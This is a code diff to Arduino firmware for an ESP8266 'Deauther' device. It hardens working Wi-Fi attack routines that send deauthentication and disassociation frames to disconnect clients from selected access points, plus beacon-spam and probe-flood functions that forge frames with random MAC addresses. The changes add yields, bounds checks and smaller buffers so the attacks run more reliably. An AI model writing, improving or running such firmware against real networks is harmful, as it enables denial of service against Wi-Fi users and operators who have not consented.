@@ -8,13 +8,25 @@
 
 extern "C" {
   #include "user_interface.h"
+  #include "espnow.h"
+  typedef void (*freedom_outside_cb_t)(uint8_t status);
+  int wifi_send_pkt_freedom(uint8_t *buf, int len, bool sys_seq);
 }
 
 #include <ESP8266WiFi.h>
 #include <ESP8266WebServer.h>
 #include <DNSServer.h>
 #include <EEPROM.h>
-#include <LittleFS.h>
+
+// LittleFS compatibility check
+#if defined(ESP8266)
+  #include <LittleFS.h>
+  #define FILESYSTEM LittleFS
+#else
+  #include <SPIFFS.h>
+  #define FILESYSTEM SPIFFS
+#endif
+
 #include <vector>
 #include <algorithm>
 #include <functional>
@@ -31,8 +43,8 @@ T minVal(T a, T b) {
 #define AP_PASS "deauther"
 #define LED_PIN 2
 #define BUTTON_PIN 0
-#define MAX_SSIDS 50
-#define MAX_STATIONS 50
+#define MAX_SSIDS 20
+#define MAX_STATIONS 20
 
 // Web server and DNS
 ESP8266WebServer server(80);
@@ -1150,6 +1162,18 @@ void setup() {
   Serial.begin(115200);
   Serial.println();
   Serial.println("ESP8266 Deauther Advanced v4.0.0 - Developed by 0x0806");
+  
+  // Check ESP8266 core version
+  #ifdef ESP8266
+    Serial.print("ESP8266 Core Version: ");
+    Serial.println(ESP.getCoreVersion());
+    Serial.print("SDK Version: ");
+    Serial.println(ESP.getSdkVersion());
+  #endif
+  
+  // Check free heap
+  Serial.print("Free Heap: ");
+  Serial.println(ESP.getFreeHeap());
 
   // Initialize LED
   pinMode(LED_PIN, OUTPUT);
@@ -1166,10 +1190,13 @@ void setup() {
   wifi_set_promiscuous_rx_cb(packetSniffer);
 
   // Start file system
-  if (!LittleFS.begin()) {
-    Serial.println("LittleFS initialization failed");
-    LittleFS.format();
-    LittleFS.begin();
+  if (!FILESYSTEM.begin()) {
+    Serial.println("File system initialization failed");
+    if (!FILESYSTEM.format()) {
+      Serial.println("File system format failed");
+    } else {
+      FILESYSTEM.begin();
+    }
   }
 
   // Load settings
@@ -1293,28 +1320,58 @@ void setup() {
 }
 
 void loop() {
+  // Yield frequently to prevent watchdog timeouts
+  yield();
+  
   dnsServer.processNextRequest();
+  yield();
+  
   server.handleClient();
+  yield();
 
-  // Handle attacks
+  // Handle attacks with yields
   if (attacking) {
     performAttack();
+    yield();
   }
 
   if (beaconSpam) {
     performBeaconSpam();
+    yield();
   }
 
   if (probeAttack) {
     performProbeAttack();
+    yield();
   }
 
   // Update LED
   updateLED();
+  yield();
+
+  // Memory cleanup every 30 seconds
+  static unsigned long lastCleanup = 0;
+  if (millis() - lastCleanup > 30000) {
+    lastCleanup = millis();
+    
+    // Trim vectors if they're too large
+    if (accessPoints.size() > MAX_SSIDS) {
+      accessPoints.resize(MAX_SSIDS);
+    }
+    if (stations.size() > MAX_STATIONS) {
+      stations.resize(MAX_STATIONS);
+    }
+    if (ssidList.size() > MAX_SSIDS) {
+      ssidList.resize(MAX_SSIDS);
+    }
+    
+    yield();
+  }
 
   // Check button for reset
   if (digitalRead(BUTTON_PIN) == LOW) {
     delay(50);
+    yield();
     if (digitalRead(BUTTON_PIN) == LOW) {
       unsigned long pressTime = millis();
       while (digitalRead(BUTTON_PIN) == LOW) {
@@ -1330,6 +1387,7 @@ void loop() {
           break;
         }
         delay(100);
+        yield();
       }
     }
   }
@@ -1545,6 +1603,16 @@ void handleAPI() {
   server.send(200, "application/json", json);
 }
 
+// Safer packet sending function with error handling
+bool sendPacketSafely(uint8_t* packet, uint16_t len) {
+  #ifdef ESP8266
+    return wifi_send_pkt_freedom(packet, len, 0) == 0;
+  #else
+    // Fallback for other platforms
+    return false;
+  #endif
+}
+
 void performAttack() {
   static unsigned long lastAttack = 0;
   static int currentAP = 0;
@@ -1557,87 +1625,107 @@ void performAttack() {
     lastAttack = millis();
 
     int attempts = 0;
-    while (attempts < accessPoints.size()) {
-      if (currentAP >= accessPoints.size()) {
+    while (attempts < (int)accessPoints.size() && attempts < 10) { // Limit attempts
+      if (currentAP >= (int)accessPoints.size()) {
         currentAP = 0;
       }
 
-      if (accessPoints[currentAP].selected) {
+      if (currentAP < (int)accessPoints.size() && accessPoints[currentAP].selected) {
         String bssid = accessPoints[currentAP].bssid;
         uint8_t mac[6];
 
-        // Parse BSSID string to MAC array
-        for (int i = 0; i < 6; i++) {
-          String hex = bssid.substring(i * 3, i * 3 + 2);
-          mac[i] = strtol(hex.c_str(), NULL, 16);
+        // Parse BSSID string to MAC array with bounds checking
+        bool validMAC = true;
+        for (int i = 0; i < 6 && validMAC; i++) {
+          if (bssid.length() >= (i * 3 + 2)) {
+            String hex = bssid.substring(i * 3, i * 3 + 2);
+            mac[i] = strtol(hex.c_str(), NULL, 16);
+          } else {
+            validMAC = false;
+          }
         }
 
-        // Set WiFi channel
-        wifi_set_channel(accessPoints[currentAP].channel);
-
-        // Enhanced attack with multiple vectors
-        if (packetType == 0) {
-          // Broadcast deauth to all clients
-          for (int i = 0; i < 6; i++) {
-            deauthPacket[4 + i] = 0xFF;  // Broadcast target
-            deauthPacket[10 + i] = mac[i]; // AP source
-            deauthPacket[16 + i] = mac[i]; // BSSID
+        if (validMAC) {
+          // Set WiFi channel safely
+          int channel = accessPoints[currentAP].channel;
+          if (channel >= 1 && channel <= 14) {
+            wifi_set_channel(channel);
           }
 
-          // Send multiple deauth packets with different reason codes
-          uint8_t reasonCodes[] = {1, 2, 3, 4, 5, 6, 7, 8, 15, 16};
-          for (int i = 0; i < 5; i++) {
-            deauthPacket[24] = reasonCodes[i % 10];
-            wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
-            stats.deauthPackets++;
-            totalPackets++;
-            delayMicroseconds(500);
-          }
+          // Enhanced attack with multiple vectors
+          if (packetType == 0) {
+            // Broadcast deauth to all clients
+            for (int i = 0; i < 6; i++) {
+              deauthPacket[4 + i] = 0xFF;  // Broadcast target
+              deauthPacket[10 + i] = mac[i]; // AP source
+              deauthPacket[16 + i] = mac[i]; // BSSID
+            }
 
-          // Target specific stations if available
-          for (int s = 0; s < stations.size() && s < 3; s++) {
-            if (stations[s].ap_mac == bssid) {
-              // Parse station MAC
-              uint8_t staMac[6];
-              for (int j = 0; j < 6; j++) {
-                String hex = stations[s].mac.substring(j * 3, j * 3 + 2);
-                staMac[j] = strtol(hex.c_str(), NULL, 16);
-              }
-
-              // Targeted deauth
-              for (int j = 0; j < 6; j++) {
-                deauthPacket[4 + j] = staMac[j];  // Station target
-                deauthPacket[10 + j] = mac[j];    // AP source
-              }
-
-              for (int k = 0; k < 2; k++) {
-                wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
+            // Send fewer packets to reduce memory pressure
+            uint8_t reasonCodes[] = {1, 2, 3, 4, 7};
+            for (int i = 0; i < 3; i++) { // Reduced from 5 to 3
+              deauthPacket[24] = reasonCodes[i % 5];
+              if (sendPacketSafely(deauthPacket, sizeof(deauthPacket))) {
                 stats.deauthPackets++;
                 totalPackets++;
-                delayMicroseconds(300);
+              }
+              delayMicroseconds(1000); // Increased delay
+            }
+
+            // Target specific stations if available (reduced iterations)
+            int stationLimit = minVal(2, (int)stations.size()); // Reduced from 3 to 2
+            for (int s = 0; s < stationLimit; s++) {
+              if (stations[s].ap_mac == bssid) {
+                // Parse station MAC with bounds checking
+                uint8_t staMac[6];
+                bool validStaMAC = true;
+                for (int j = 0; j < 6 && validStaMAC; j++) {
+                  if (stations[s].mac.length() >= (j * 3 + 2)) {
+                    String hex = stations[s].mac.substring(j * 3, j * 3 + 2);
+                    staMac[j] = strtol(hex.c_str(), NULL, 16);
+                  } else {
+                    validStaMAC = false;
+                  }
+                }
+
+                if (validStaMAC) {
+                  // Targeted deauth
+                  for (int j = 0; j < 6; j++) {
+                    deauthPacket[4 + j] = staMac[j];  // Station target
+                    deauthPacket[10 + j] = mac[j];    // AP source
+                  }
+
+                  // Reduced iterations
+                  if (sendPacketSafely(deauthPacket, sizeof(deauthPacket))) {
+                    stats.deauthPackets++;
+                    totalPackets++;
+                  }
+                  delayMicroseconds(500);
+                }
               }
             }
-          }
-        } else {
-          // Enhanced disassociation attack
-          for (int i = 0; i < 6; i++) {
-            disassocPacket[4 + i] = 0xFF;     // Broadcast target
-            disassocPacket[10 + i] = mac[i];  // AP source
-            disassocPacket[16 + i] = mac[i];  // BSSID
+          } else {
+            // Enhanced disassociation attack
+            for (int i = 0; i < 6; i++) {
+              disassocPacket[4 + i] = 0xFF;     // Broadcast target
+              disassocPacket[10 + i] = mac[i];  // AP source
+              disassocPacket[16 + i] = mac[i];  // BSSID
+            }
+
+            // Send fewer disassociation packets
+            uint8_t disassocReasons[] = {1, 2, 3, 5};
+            for (int i = 0; i < 2; i++) { // Reduced from 4 to 2
+              disassocPacket[24] = disassocReasons[i % 4];
+              if (sendPacketSafely(disassocPacket, sizeof(disassocPacket))) {
+                stats.deauthPackets++;
+                totalPackets++;
+              }
+              delayMicroseconds(800);
+            }
           }
 
-          // Send disassociation with multiple reason codes
-          uint8_t disassocReasons[] = {1, 2, 3, 5, 8, 12, 13, 14};
-          for (int i = 0; i < 4; i++) {
-            disassocPacket[24] = disassocReasons[i % 8];
-            wifi_send_pkt_freedom(disassocPacket, sizeof(disassocPacket), 0);
-            stats.deauthPackets++;
-            totalPackets++;
-            delayMicroseconds(400);
-          }
+          packetType = (packetType + 1) % 2;
         }
-
-        packetType = (packetType + 1) % 2;
         break;
       }
 
@@ -1652,93 +1740,79 @@ void performAttack() {
 void performBeaconSpam() {
   static unsigned long lastBeacon = 0;
   static int currentSSID = 0;
-  static uint8_t macBase[3] = {0x00, 0x00, 0x00};
 
-  if (millis() - lastBeacon > 50) { // Send beacons every 50ms for higher density
+  if (millis() - lastBeacon > 100) { // Increased interval to reduce memory pressure
     lastBeacon = millis();
 
-    // Find next enabled SSID
+    // Find next enabled SSID with bounds checking
     int attempts = 0;
-    while (attempts < (int)ssidList.size()) {
+    int maxAttempts = minVal(10, (int)ssidList.size());
+    
+    while (attempts < maxAttempts) {
       if (currentSSID >= (int)ssidList.size()) {
         currentSSID = 0;
       }
 
-      if (ssidList[currentSSID].enabled) {
+      if (currentSSID < (int)ssidList.size() && ssidList[currentSSID].enabled) {
         String ssid = ssidList[currentSSID].ssid;
 
-        // Create multiple beacons per SSID for better visibility
-        for (int beaconCount = 0; beaconCount < 2; beaconCount++) {
-          uint8_t packet[128];
-          memcpy(packet, beaconPacket, sizeof(beaconPacket));
+        // Create single beacon per iteration to save memory
+        uint8_t packet[100]; // Reduced packet size
+        memcpy(packet, beaconPacket, minVal(80, sizeof(beaconPacket)));
 
-          // Realistic MAC address generation
-          packet[10] = 0x02; // Locally administered bit
-          packet[11] = random(0x00, 0xFF);
-          packet[12] = random(0x00, 0xFF);
-          packet[13] = random(0x00, 0xFF);
-          packet[14] = random(0x00, 0xFF);
-          packet[15] = random(0x00, 0xFF);
+        // Realistic MAC address generation
+        packet[10] = 0x02; // Locally administered bit
+        packet[11] = random(0x00, 0xFF);
+        packet[12] = random(0x00, 0xFF);
+        packet[13] = random(0x00, 0xFF);
+        packet[14] = random(0x00, 0xFF);
+        packet[15] = random(0x00, 0xFF);
 
-          // Copy source to BSSID
-          memcpy(&packet[16], &packet[10], 6);
+        // Copy source to BSSID
+        memcpy(&packet[16], &packet[10], 6);
 
-          // Random timestamp
-          uint64_t timestamp = esp_random();
-          memcpy(&packet[24], &timestamp, 8);
+        // Simple timestamp
+        uint32_t timestamp = millis();
+        memcpy(&packet[24], &timestamp, 4);
 
-          // Random beacon interval (100-1000ms)
-          uint16_t beaconInterval = random(100, 1000);
-          packet[32] = beaconInterval & 0xFF;
-          packet[33] = (beaconInterval >> 8) & 0xFF;
+        // Beacon interval
+        packet[32] = 0x64; // 100 TU
+        packet[33] = 0x00;
 
-          // Capability info with realistic flags
-          packet[34] = 0x01; // ESS capability
-          packet[35] = ssidList[currentSSID].wpa2 ? 0x10 : 0x00; // Privacy bit
+        // Capability info
+        packet[34] = 0x01; // ESS capability
+        packet[35] = ssidList[currentSSID].wpa2 ? 0x10 : 0x00;
 
-          // SSID element
-          int ssidLen = minVal(32, (int)ssid.length());
-          packet[37] = ssidLen;
-          for (int i = 0; i < ssidLen; i++) {
-            packet[38 + i] = ssid[i];
-          }
-
-          int pos = 38 + ssidLen;
-
-          // Supported rates element
-          packet[pos++] = 0x01; // Element ID
-          packet[pos++] = 0x08; // Length
-          uint8_t rates[] = {0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C};
-          memcpy(&packet[pos], rates, 8);
-          pos += 8;
-
-          // DS Parameter Set (channel)
-          packet[pos++] = 0x03; // Element ID
-          packet[pos++] = 0x01; // Length
-          packet[pos++] = random(1, 14); // Random channel
-
-          // WPA/WPA2 information elements for encrypted networks
-          if (ssidList[currentSSID].wpa2) {
-            // RSN Information Element (WPA2)
-            packet[pos++] = 0x30; // Element ID
-            packet[pos++] = 0x14; // Length
-            uint8_t rsnInfo[] = {
-              0x01, 0x00, // Version
-              0x00, 0x0F, 0xAC, 0x02, // Group cipher (TKIP)
-              0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04, // Pairwise cipher (CCMP)
-              0x01, 0x00, 0x00, 0x0F, 0xAC, 0x02, // AKM suite (PSK)
-              0x00, 0x00 // RSN capabilities
-            };
-            memcpy(&packet[pos], rsnInfo, 20);
-            pos += 20;
-          }
-
-          // Send the beacon
-          wifi_send_pkt_freedom(packet, pos, 0);
-          stats.beaconPackets++;
-          delayMicroseconds(random(100, 500));
+        // SSID element with bounds checking
+        int ssidLen = minVal(20, (int)ssid.length()); // Reduced max SSID length
+        packet[37] = ssidLen;
+        for (int i = 0; i < ssidLen; i++) {
+          packet[38 + i] = ssid[i];
         }
 
+        int pos = 38 + ssidLen;
+
+        // Basic supported rates
+        if (pos + 10 < 100) {
+          packet[pos++] = 0x01; // Element ID
+          packet[pos++] = 0x04; // Reduced length
+          packet[pos++] = 0x82; // 1 Mbps
+          packet[pos++] = 0x84; // 2 Mbps
+          packet[pos++] = 0x8B; // 5.5 Mbps
+          packet[pos++] = 0x96; // 11 Mbps
+
+          // DS Parameter Set
+          packet[pos++] = 0x03; // Element ID
+          packet[pos++] = 0x01; // Length
+          packet[pos++] = random(1, 12); // Random channel (1-11)
+        }
+
+        // Send the beacon with size checking
+        if (pos <= 100 && sendPacketSafely(packet, pos)) {
+          stats.beaconPackets++;
+        }
+        
+        delayMicroseconds(1000); // Increased delay
         break;
       }
 
@@ -1754,40 +1828,51 @@ void performProbeAttack() {
   static unsigned long lastProbe = 0;
   static int currentSSID = 0;
 
-  if (millis() - lastProbe > 200) { // Send probe every 200ms
+  if (millis() - lastProbe > 300) { // Increased interval
     lastProbe = millis();
 
-    // Find next enabled SSID
+    // Find next enabled SSID with bounds checking
     int attempts = 0;
-    while (attempts < (int)ssidList.size()) {
+    int maxAttempts = minVal(10, (int)ssidList.size());
+    
+    while (attempts < maxAttempts) {
       if (currentSSID >= (int)ssidList.size()) {
         currentSSID = 0;
       }
 
-      if (ssidList[currentSSID].enabled) {
+      if (currentSSID < (int)ssidList.size() && ssidList[currentSSID].enabled) {
         String ssid = ssidList[currentSSID].ssid;
 
-        // Prepare probe packet
-        uint8_t packet[68];
-        memcpy(packet, probePacket, sizeof(probePacket));
+        // Prepare probe packet with bounds checking
+        uint8_t packet[60]; // Reduced size
+        if (sizeof(probePacket) <= 60) {
+          memcpy(packet, probePacket, sizeof(probePacket));
+        } else {
+          memcpy(packet, probePacket, 60);
+        }
 
         // Random MAC address
         for (int i = 10; i < 16; i++) {
           packet[i] = random(0, 255);
         }
 
-        // Set SSID in probe packet - ensure proper bounds
-        int ssidLen = minVal(32, (int)ssid.length());
-        packet[25] = ssidLen;
-        for (int i = 0; i < ssidLen; i++) {
-          packet[26 + i] = ssid[i];
-        }
+        // Set SSID in probe packet with proper bounds
+        int ssidLen = minVal(20, (int)ssid.length()); // Reduced max length
+        if (25 < 60) {
+          packet[25] = ssidLen;
+          for (int i = 0; i < ssidLen && (26 + i) < 60; i++) {
+            packet[26 + i] = ssid[i];
+          }
 
-        // Send probe packet with proper size calculation
-        int packetSize = 26 + ssidLen + 15;
-        if (packetSize > 68) packetSize = 68;
-        wifi_send_pkt_freedom(packet, packetSize, 0);
-        stats.probePackets++;
+          // Calculate packet size safely
+          int packetSize = 26 + ssidLen + 10; // Reduced overhead
+          if (packetSize > 60) packetSize = 60;
+
+          // Send probe packet
+          if (sendPacketSafely(packet, packetSize)) {
+            stats.probePackets++;
+          }
+        }
 
         break;
       }
